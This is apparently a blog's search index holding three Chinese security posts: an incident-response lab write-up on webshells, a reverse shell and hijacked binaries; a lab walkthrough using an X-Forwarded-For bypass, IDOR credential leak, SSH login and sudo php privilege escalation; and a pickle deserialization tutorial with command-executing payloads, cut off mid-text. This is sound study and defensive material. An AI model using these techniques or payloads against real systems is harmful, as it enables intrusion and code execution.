<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>应急加固做题记录</title>
      <link href="/2024/04/18/%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%951/"/>
      <url>/2024/04/18/%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%951/</url>
      
        <content type="html"><![CDATA[<p>知识点:js劫持 ,find命令 ,分析日志流量溯源技巧 ,mysql加固 ,linux命令劫持修复</p><hr><p>前段时间突然对蓝队技术也有点感兴趣,之前在bugku就看到有应急响应的靶机,但是一直没尝试,前两天正好看到TLS的内部文档里有一篇讲解这个靶机的WP,便看着打了一遍,过程中学到了蛮多细节上的东西和小知识点,遂记录一下</p><p>首先,SSH连接服务器,了解一下开放的端口<br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/%E7%AB%AF%E5%8F%A3.png?raw=true" alt="[端口.png]"></p><h1><font color="#00b0f0">0x01</font> 获取js劫持的域名</h1><p>访问web目录,发生了自动跳转<img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/web.png?raw=true" alt="[web.png]"><br>跳转的域名就是劫持的JS域名<br><a href="https://www.194nb.com">https://www.194nb.com</a></p><h1><font color="#00b0f0">0x02</font> 黑客首次webshell 密码</h1><p>先切换到/var/www/html web根目录,从文件名找找<code>find /var/www/html -name &quot;*.php&quot; -maxdepth 10</code><br>这里<code>-maxdepth 10</code>限制了搜索的目录深度为10层<img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/%E6%9F%A5%E7%9C%8Bweb%E7%9B%AE%E5%BD%95.png?raw=true" alt="[查看web目录.png]"><br>在Upload目录下有php文件,这个6127的很有可能就是黑客上传的webshell<br>查看一下<img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/%E5%BA%94%E6%80%A52.png?raw=true" alt="[应急2.png]"><br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/%E5%BA%94%E6%80%A53.png?raw=true" alt="[应急3.png]"><br>ok ,果然</p><h1><font color="#00b0f0">0x03</font>黑客首次攻击（非有效攻击）通过什么方式</h1><p>首次入侵的方式我们需要去审计日志最开始查看端口信息可以知道中间件服务是Nginx，所以先去查看Nginx的配置信息<code>find / -name &quot;nginx.config&quot;</code><br>查看后可以得到日志的位置</p><figure class="highlight plaintext"><figcaption><span>Settings</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">access_log /var/log/nginx/access.log;</span><br><span class="line">error_log /var/log/nginx/error.log;</span><br></pre></td></tr></table></figure><p>然后把日志文件下载到主机上,这样方便分析,我用的是xshell的xftp<br>然后搜索一下上传这个webshell的流量记录,溯源到了攻击者的ip<br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/%E5%BA%94%E6%80%A54.png?raw=true" alt="[应急4.png]"><br>这样我们就可以从全部流量中过滤出黑客的操作</p><p>用notepad++查找攻击者的ip,然后提取有关键词的全部行,这也是我这次学到的一个操作,具体可参考<a href="https://blog.csdn.net/eylanpp/article/details/123554322">NOTEPAD++提取含关键字的全部行</a>这样就大大减轻了审计工作将提取出的流量保存在新的一个文件中<img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/POST.png?raw=true" alt="[POST.png]">搜索post,前面几个都看不出什么问题,第六个就是很明显的是XSS了直接提交</p><h1><font color="#00b0f0">0x04</font>请找到黑客留下的后门中黑客服务器的ip及端口</h1><p>查看了一下上传的木马里面并没有黑客服务器的ip信息<img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/%E5%BA%94%E6%80%A55.png?raw=true" alt="[应急5.png]"><br>继续分析流量日志中找不到免杀马的落地记录，应该是流量经过编码了，分析一下流量<br>![[流量.png]]继续看post请求,后面开始有大量的连续流量,随便url转码一个<img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/%E5%BA%94%E6%80%A56.png?raw=true" alt="[应急6.png]"><br>为了方便阅读可以把&quot;;'都替换为&quot;;\r\n&quot;这样可以换行,清晰很多可以看到执行命令的语句,以及最后有每个包的传参拿着参数名字再搜索一下<img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/%E5%BA%94%E6%80%A57.png?raw=true" alt="[应急7.png]"><br>然后可以按照规则base64解码,这里我一开始拿着参数值转码怎么都是乱码,后来仔细分析发现原来忽略了substr的截取,substr(“xxxx”,2)是从第3个字符开始的,去掉前两个字符之后再转就好了<br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/%E5%BA%94%E6%80%A58.png?raw=true" alt="[应急8.png]"><br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/%E5%BA%94%E6%80%A59.png?raw=true" alt="[应急9.png]"><br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/%E5%BA%94%E6%80%A513.png?raw=true" alt="[应急13.png]"><br>ok现在知道了每个参数则作用了,有指定shell脚本的,有指定目录的,有执行rce语句的那么我们就去/cache这个黑客进行操作的目录看看<br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/%E5%BA%94%E6%80%A514.png?raw=true" alt="[应急14.png]"><br>ok啊反弹shell,拿下ip和端口</p><h1><font color="#00b0f0">0x05</font>提交黑客上传的第二个webshell内的flag</h1><p>之前找到过webshell,但是没flag,那应该不止这一个，重新找一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/html -name &quot;*.php&quot; -</span><br><span class="line">maxdepth 10```</span><br></pre></td></tr></table></figure><p><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/webshell2.png?raw=true" alt="[webshell2.png]"><br>/img还能找到一个.php<img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/falg.png?raw=true" alt="[falg.png]"></p><h1><font color="#00b0f0">0x06</font>修复mysql可getshell漏洞</h1><p>这个是一点想法没有,看了大佬wp知道是要加固mysql的安全配置：secure_file_priv</p><p>首先是查看mysql的配置文件`vim /etc/mysql/my.cnf<br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/myconf.png?raw=true" alt="[myconf.png]"><br>可以看到secure-file-priv的值为空的,加固做法是直接注释掉就好了(</p><ul class="lvl-0"><li class="lvl-2"><p>secure_file_priv 这个变量被用于限制导入和导出的数据目录，比如 LOAD DATA 和 SELECT … INTO OUTFILE 语句，以及 LOAD_FILE() 函数。这些操作限制了哪些用户拥有文件操作权限。</p></li><li class="lvl-2"><p>secure_file_priv 有些设置选项:</p><ul class="lvl-2"><li class="lvl-6">如果为空，不做目录限制，即任何目录均可以。</li><li class="lvl-6">如果指定了目录，MySQL 会限制只能从该目录导入、或导出到该目录。目录必须已存在，MySQL 不会自动创建该目录。</li><li class="lvl-6">如果设置为 NULL，MySQL 服务器禁止导入与导出功能。</li><li class="lvl-6">该变量的默认值，是由编译时的 CMake 选项而定。</li></ul></li><li class="lvl-2"><p>MySQL 服务器在启动时，会检查 secure_file_priv 变量值，如果值不安全会在错误日志中写一个 WARNING 级别的日志。以下情况属于不安全的设置：</p><ul class="lvl-2"><li class="lvl-6">值为空</li><li class="lvl-6">值为–datadir目录或其子目录</li><li class="lvl-6">所有用户均有权限访问的目录</li></ul></li></ul><h1>0x07找到黑客添加的账号并删除</h1><p><code>cat /etc/shadow</code><br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/%E8%B4%A6%E5%8F%B7.png?raw=true" alt="[账号.png]"><br>摘了一段</p><blockquote><p>/etc/shadow 是干嘛用的？<br>/etc/shadow 文件，用于存储 Linux 系统中用户的密码信息，又称为“影子文件”。</p></blockquote><pre><code>早期的 UNIX 密码放在 /etc/passwd 文件中，由于该文件允许所有用户读取，易导致用户密码泄露，因此从 /etc/passwd 文件中分离出来，并单独放到了此文件中。/etc/shadow 文件只有 root 用户拥有读权限，保证了用户密码的安全性。</code></pre><p>具体看<a href="https://blog.csdn.net/happyjacob/article/details/109701906">Linux /etc/shadow（影子文件）内容详解_unix /etc/shadow-CSDN博客</a></p><p>发现aman账号<code>userdel aman</code><br>发现无法删除要用<code>groupdel aman</code><br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/del.png?raw=true" alt="[del.png]"><br>ai的解释</p><blockquote><p>在Linux系统中，每个用户可以属于一个或多个组。其中一个组被称为用户的“主组”（primary group），通常用户的用户名和主组的组名是相同的。当尝试从一个组中删除用户时，如果该组是用户的主组，那么用户不会被从该组中删除。这是因为用户的主组通常与用户的个人目录和文件的权限设置相关联。</p></blockquote><blockquote><p>这条消息：<code>userdel: group 'aman' not removed because it is not the primary group of user 'aman'</code><br>表明你尝试使用<code>userdel</code>命令删除名为<code>aman</code>的组，但是这个组不是用户<code>aman</code>的主组。如果你想删除用户<code>aman</code>，你需要确保他不属于任何文件的拥有者，并且没有任何进程正在运行，然后使用<code>userdel</code>命令来删除用户。</p></blockquote><h1><font color="#00b0f0">0x08</font>修复黑客篡改的命令并且删除篡改命令生成的免杀马</h1><p>使用 dpkg -V 查看系统被修改过的系统指令<img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/dpkg.png?raw=true" alt="[dpkg.png]"><br>重点关注两个/bin下的就好了使用ls -l可以查看目录中文件及其属性信息<br>![[ls -l.png]](<a href="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/ls">https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/ls</a> -l.png?raw=true)<br>可以看到修改时间和前面日志看到的攻击时间高度吻合,应该就是了<img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/_ps.png?raw=true" alt="[_ps.png]"><br>是一个免杀马写入的程序(具体为什么我也不知道)<br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/-ls.png?raw=true" alt="[-ls.png]"><br>所幸有备份<br>![[cat ls.png]](<a href="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/cat">https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/cat</a> ls.png?raw=true)<br>直接`cp /bin/ls2 /bin/ls<br>覆盖了即可修复再rm掉之前看到那个免杀马即可</p><h1><font color="#00b0f0">0x09</font>修复黑客篡改的命令2</h1><p>ps命令,步骤同ls</p><h1><font color="#00b0f0">0x10</font>修复JS劫持</h1><p>访问主页时抓包<img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/%E6%8A%93%E5%8C%85.png?raw=true" alt="[抓包.png]"><br>返回包搜索js能找到一段被加密过的的js代码,不出意外就是劫持代码了在网站根目录可以找到这段代码<img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/%E5%88%A0js.png?raw=true" alt="[删js.png]"><br>删掉即可</p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>me_and_my_girlfriend-打靶记录</title>
      <link href="/2024/04/11/me-and-my-girlfriend-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/04/11/me-and-my-girlfriend-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h5 id="手工爆库、php提权">手工爆库、php提权</h5><hr><p>启动好靶机之后先查看一下kali的ip<br><code>ip a</code><br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/b501152dca57d9d2aea45ef50d8d980.png?raw=true" alt="b501152dca57d9d2aea45ef50d8d980"></p><p>然后因为靶机和kali是在同一个C段的直接nmap扫一下子网<code>nmap -sn 192.168.136.0/24</code><br>除了kali的130多出了一个133,应该就是靶机了<br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/e4b436ed9b614ca335301cedebcc51b.png?raw=true" alt="e4b436ed9b614ca335301cedebcc51b"></p><p>端口发现<code>nmap -A 192.168.136.133</code><br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/79f0748d6f4484ae3dc0184ca740b53.png?raw=true" alt="79f0748d6f4484ae3dc0184ca740b53"><br>图形工具也可以,就是不太优雅</p><p><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/6cfd4f1cb481b234808175f07a15b32.png?raw=true" alt="6cfd4f1cb481b234808175f07a15b32"></p><p>扫出来两个端口,一个22的是SSH服务的,因为还没拿到账号密码所以暂时先放着<br>80端口运行一个Apache的web服务,直接web端访问一下(命令行直接curl也行)<br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/be2265491907be04b559ddd07658827.png?raw=true" alt="be2265491907be04b559ddd07658827"><br>可以看到是要本地访问,源码提示了x-forwarded-for<br>暂时先放着,继续信息收集</p><p><code>sudo nmap --script=vuln -p22,80 192.168.28.51 -oA nmapscan/vuln</code><br>这个命令可以让nmap使用指定脚本(vuln)在扫描端口的同时检测漏洞,这次没有扫出什么.但是以后可以作为信息收集的一步,如果可以在信息收集时就找到漏洞就最好了</p><h3 id="目录爆破">目录爆破</h3><p><code>sudo gobuster dir -u http://192.168.136.133 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</code><br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/3523.png?raw=true" alt="Pasted image 20240410233523"></p><p><code>sudo gobuster dir -u http://192.168.136.133 -x txt,sql,rar,zip,tar -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</code><br>在爆破目录的同时重点查找-x指定的扩展名<br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/31e3e7849fab0ee175aca2661239d8a.png?raw=true" alt="Pasted image 20240410234004"><br>/misc应该是默认的一些配置页面<br>/config页面下有一个config.php,但是无法访问那么信息收集差不多就结束了,下面尝试本地访问</p><p>在BP中的匹配与替换规则中新增一个x-forwarded-for:localhost规则,这个不用每次都要抓包手动加http头<br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/2434cae61fc0635a635ba4e15ef5f75%201.png?raw=true" alt="2434cae61fc0635a635ba4e15ef5f75 2"></p><p>成功访问后可以看到除了登录系统,注册系统外并无其他功能注册一个看看<br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/094eaa8faa3a2b4d60451afc19f95be.png?raw=true" alt="094eaa8faa3a2b4d60451afc19f95be"></p><p>ok了登录之后再profile这里发现到url中的user_id,学过sql注入的可以猜到,数据库的查询操作应该是直接使用get方法在url传递的. 这是网站一个很危险的处理方法<br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/13d5dd722b04b6b4813eff707f1dbf8.png?raw=true" alt="13d5dd722b04b6b4813eff707f1dbf8"></p><p>果然啊,直接改user_id就可以查看到其他用户的账号名密码则是在源码中直接看到明文了<br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/2235.png?raw=true" alt="Pasted image 20240411002235"></p><p>这里由于用户不多 可以直接将账号密码尝试连接前面发现的22端口的SSH服务,手工枚举几次<br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/e39f7ff9a510b8d51a41005cc677edb.png?raw=true" alt="e39f7ff9a510b8d51a41005cc677edb"></p><p>在试到第五个账号alice时,可以看到已经链接成功了<br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/e39f7ff9a510b8d51a41005cc677edb.png?raw=true" alt="e39f7ff9a510b8d51a41005cc677edb"></p><p>到处看看<br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/6726e7e7ea4610059f692a83f68e2ed.png?raw=true" alt="6726e7e7ea4610059f692a83f68e2ed"></p><p>使用ls -liah可以列出隐藏文件<br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/2563f53d88975ad52077b7744c90499.png?raw=true" alt="2563f53d88975ad52077b7744c90499"></p><p>可疑的.my_secret</p><p><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/9a84df951023a27e54101ca1ab4bfaa.png?raw=true" alt="9a84df951023a27e54101ca1ab4bfaa"></p><p>flag1拿下<br>shell里面没有clear命令,为了页面简洁完善环境变量<br>`export TERM=xterm-color</p><p>然后访问/var/www/html<br>可以查看到我们之前在web端的config页面有目录但无法访问的的config.php<br>首先看看可用的系统命令,可以看到是有php的<br><code>sudo -l</code><br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/sudo-l.png?raw=true" alt="sudo-l"></p><p>下面就是提权各种提权方式可在<a href="https://gtfobins.github.io/%E6%9F%A5%E8%AF%A2">https://gtfobins.github.io/查询</a></p><p>那么就有很多提权方式了,反弹shell也可以这里用的是最简单的由php直接调用系统命令新建一个/bin/bash会话(system,exec,passthru)都可以<br><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/9de046ff4997afec9f1d45b16ed48fe.png?raw=true" alt="flag2"></p><pre><code>在PHP中，`-r` 参数是用于在命令行模式下执行一段PHP代码，而不是运行一个PHP脚本文件。这个参数允许用户直接在命令行中输入PHP代码，并立即执行，得到结果，这对于快速测试代码片段或者进行交互式编程非常有用</code></pre><p>拿到flag2,结束</p>]]></content>
      
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pickle</title>
      <link href="/2024/03/29/pickle/"/>
      <url>/2024/03/29/pickle/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>pickle 是一种栈语言，有不同的编写方式，基于一个轻量的 PVM（Pickle Virtual Machine）。<br>PVM 由三部分组成：</p><ol><li class="lvl-3"><p><strong>指令处理器</strong><br>从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。  最终留在栈顶的值将被作为反序列化对象返回。</p></li><li class="lvl-3"><p><strong>stack</strong><br>由 Python 的 list 实现，被用来临时存储数据、参数以及对象。</p></li><li class="lvl-3"><p><strong>memo</strong><br>由 Python 的 dict 实现，为 PVM 的整个生命周期提供存储。</p></li></ol><p>pickle在(反)序列化中用到的函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 序列化</span></span><br><span class="line">pickle.dump(文件) </span><br><span class="line">pickle.dumps(字符串)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反序列化</span></span><br><span class="line">pickle.load(文件)</span><br><span class="line">pickle.loads(字符串) </span><br></pre></td></tr></table></figure><p>举例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Roommates</span>(<span class="title class_ inherited__">object</span>):  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name = <span class="string">&quot;lwt&quot;</span></span>):  </span><br><span class="line">        self.name = name  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">say</span>(<span class="params">self</span>):  </span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;hello!&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">a = Roommates()  </span><br><span class="line">b = pickle.dumps(a)  </span><br><span class="line">c = pickle.loads(b)  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(b)  </span><br><span class="line"><span class="built_in">print</span>(c)  </span><br><span class="line">c.say()</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出:</span></span><br><span class="line"><span class="string">b&#x27;\x80\x04\x95.\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\tRoommates\x94\x93\x94)\x81\x94&#125;\x94\x8c\x04name\x94\x8c\x03lwt\x94sb.&#x27;</span></span><br><span class="line">&lt;__main__.Roommates <span class="built_in">object</span> at <span class="number">0x0000026BD8F86640</span>&gt;</span><br><span class="line">hello!</span><br></pre></td></tr></table></figure><h3 id="可序列化的对象">可序列化的对象</h3><ul class="lvl-0"><li class="lvl-2"><p><code>None</code> 、 <code>True</code> 和 <code>False</code></p></li><li class="lvl-2"><p>整数、浮点数、复数</p></li><li class="lvl-2"><p>str、byte、bytearray</p></li><li class="lvl-2"><p>只包含可封存对象的集合，包括 tuple、list、set 和 dict</p></li><li class="lvl-2"><p>定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）</p></li><li class="lvl-2"><p>定义在模块最外层的内置函数</p></li><li class="lvl-2"><p>定义在模块最外层的类</p></li><li class="lvl-2"><p><code>__dict__</code> 属性值或 <code>__getstate__()</code> 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）</p></li></ul><p>相信搞web的师傅都对php反序列化特别熟悉</p><p>相比于 PHP 反序列化必须要依赖于当前代码中类的存在以及方法的存在，Python 凭借着自己彻底的面向对象的特性完胜 PHP ，Python 除了能反序列化当前代码中出现的类(包括通过 import的方式引入的模块中的类)的对象以外，还能利用其彻底的面向对象的特性来反序列化使用 types 创建的匿名对象，这样的话就大大拓宽了我们的攻击面</p><h2 id="反序列化攻击的重点函数">反序列化攻击的重点函数:</h2><h3 id="object-reduce-函数"><code>object.__reduce__()</code> 函数</h3><ul class="lvl-0"><li class="lvl-2"><p>在开发时，可以通过重写类的 <code>object.__reduce__()</code> 函数，使之在被实例化时按照重写的方式进行。具体而言，python要求 <code>object.__reduce__()</code> 返回一个 <code>(callable, ([para1,para2...])[,...])</code> 的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。</p></li><li class="lvl-2"><p>在下文pickle的opcode中， <code>R</code> 的作用与 <code>object.__reduce__()</code> 关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。其实 <code>R</code> 正好对应 <code>object.__reduce__()</code> 函数， <code>object.__reduce__()</code> 的返回值会作为 <code>R</code> 的作用对象，当包含该函数的对象被pickle序列化时，得到的字符串是包含了 <code>R</code> 的后文还会提到</p></li></ul><hr><p>pickle序列化后的数据是opcode,它相对其他语言所用的json格式而言易读性稍差,但是能够储存更多的python数据结构,随着python的更新迭代,opcode也有几个版本</p><h1>OPCODE</h1><p>v0 版协议是原始的 “人类可读” 协议，并且向后兼容早期版本的 Python</p><p><img src="https://github.com/P4nY0O/P4nY0O.github.io/blob/main/pic/opcode.png?raw=true" alt="opcode"><br>常用操作码:</p><ul class="lvl-0"><li class="lvl-2"><p>c : 读取本行内容作为模块名module，读取下一行内容作为对象名object，然后将module.object作为可调用对象压入栈中</p></li><li class="lvl-2"><p>( : 将一个标记对象压入栈中，作为一个确定命令执行的位置，搭配 t 使用，产生元组</p></li><li class="lvl-2"><p>s : 后面跟字符串，读取引号中的内容，直到遇见换行符，将内容压入栈</p></li><li class="lvl-2"><p>t : 从栈中不断pop出数据，直到遇见 ( 停止，产生一个元组压回栈</p></li><li class="lvl-2"><p>R : 将之前压入栈的元组和对象全部弹出，将元组作为可调用参数的对象并执行该对象，最后将结果压入栈中</p></li><li class="lvl-2"><p>. : 结束整个pickle反序列化过程</p></li><li class="lvl-2"><p>) ] }:入栈一个空t l d</p></li><li class="lvl-2"><p>b:用栈中第一个元素给第二元素赋值（和入栈顺序相反）</p></li><li class="lvl-2"><p>u:寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</p></li><li class="lvl-2"><p>d:寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</p></li><li class="lvl-2"><p>a: 将栈的第一个元素append到第二个元素(列表)中</p></li><li class="lvl-2"><p>o 寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象</p></li><li class="lvl-2"><p>i 相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象)</p></li></ul><p>更全的表</p><table><thead><tr><th>opcode</th><th>描述</th><th>具体写法</th><th>栈上的变化</th></tr></thead><tbody><tr><td>c</td><td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td><td>c[module]\n[instance]\n</td><td>获得的对象入栈</td></tr><tr><td>o</td><td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td><td>o</td><td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td></tr><tr><td>i</td><td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td><td>i[module]\n[callable]\n</td><td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td></tr><tr><td>N</td><td>实例化一个None</td><td>N</td><td>获得的对象入栈</td></tr><tr><td>S</td><td>实例化一个字符串对象</td><td>S’xxx’\n（也可以使用双引号、'等python字符串形式）</td><td>获得的对象入栈</td></tr><tr><td>V</td><td>实例化一个UNICODE字符串对象</td><td>Vxxx\n</td><td>获得的对象入栈</td></tr><tr><td>I</td><td>实例化一个int对象</td><td>Ixxx\n</td><td>获得的对象入栈</td></tr><tr><td>F</td><td>实例化一个float对象</td><td>Fx.x\n</td><td>获得的对象入栈</td></tr><tr><td>R</td><td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td><td>R</td><td>函数和参数出栈，函数的返回值入栈</td></tr><tr><td>.</td><td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td><td>.</td><td>无</td></tr><tr><td>(</td><td>向栈中压入一个MARK标记</td><td>(</td><td>MARK标记入栈</td></tr><tr><td>t</td><td>寻找栈中的上一个MARK，并组合之间的数据为元组</td><td>t</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td>)</td><td>向栈中直接压入一个空元组</td><td>)</td><td>空元组入栈</td></tr><tr><td>l</td><td>寻找栈中的上一个MARK，并组合之间的数据为列表</td><td>l</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td>]</td><td>向栈中直接压入一个空列表</td><td>]</td><td>空列表入栈</td></tr><tr><td>d</td><td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td><td>d</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td>}</td><td>向栈中直接压入一个空字典</td><td>}</td><td>空字典入栈</td></tr><tr><td>g</td><td>将memo_n的对象压栈</td><td>gn\n</td><td>对象被压栈</td></tr><tr><td>0</td><td>丢弃栈顶对象</td><td>0</td><td>栈顶对象被丢弃</td></tr><tr><td>b</td><td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td><td>b</td><td>栈上第一个元素出栈</td></tr><tr><td>s</td><td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td><td>s</td><td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td></tr><tr><td>u</td><td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td><td>u</td><td>MARK标记以及被组合的数据出栈，字典被更新</td></tr><tr><td>a</td><td>将栈的第一个元素append到第二个元素(列表)中</td><td>a</td><td>栈顶元素出栈，第二个元素（列表）被更新</td></tr><tr><td>p</td><td>将栈顶对象储存至memo_n</td><td>pn\n</td><td>无</td></tr><tr><td>e</td><td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td><td>e</td><td>MARK标记以及被组合的数据出栈，列表被更</td></tr></tbody></table><h1>举例</h1><p>pickle.loads(b&quot;““cos<br>system<br>(S’calc’<br>tR.””&quot;)</p><ul class="lvl-0"><li class="lvl-2"><p>对应os.system（“calc”）</p></li></ul><p>pickle.loads(b&quot;““c__builtin__<br>getattr<br>(c__builtin__<br><strong>import</strong><br>(S’os’<br>tRS’system’<br>tR(S’whoami’<br>tR.””&quot;)</p><ul class="lvl-0"><li class="lvl-2"><p>对应getattr(import(“os”),“system”)(“whoami”)</p></li></ul><hr><h1>v3</h1><p>v3 版协议添加于 Python 3.0。它具有对 bytes 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议<br>pickle3版本的opcode(指令码)示例：</p><ul class="lvl-0"><li class="lvl-2"><p>b’\x80\x03X\x04\x00\x00\x00abcdq\x00.’ ​</p></li><li class="lvl-2"><p>\x80：协议头声明</p></li><li class="lvl-2"><p>\x03：协议版本</p></li><li class="lvl-2"><p>\x04\x00\x00\x00：数据长度：4</p></li><li class="lvl-2"><p>abcd：数据</p></li><li class="lvl-2"><p>q：储存栈顶的字符串长度：一个字节（即\x00）</p></li><li class="lvl-2"><p>\x00：栈顶位置</p></li><li class="lvl-2"><p>.：数据截止</p></li></ul><h1>v4</h1><p>4 版协议添加于 Python 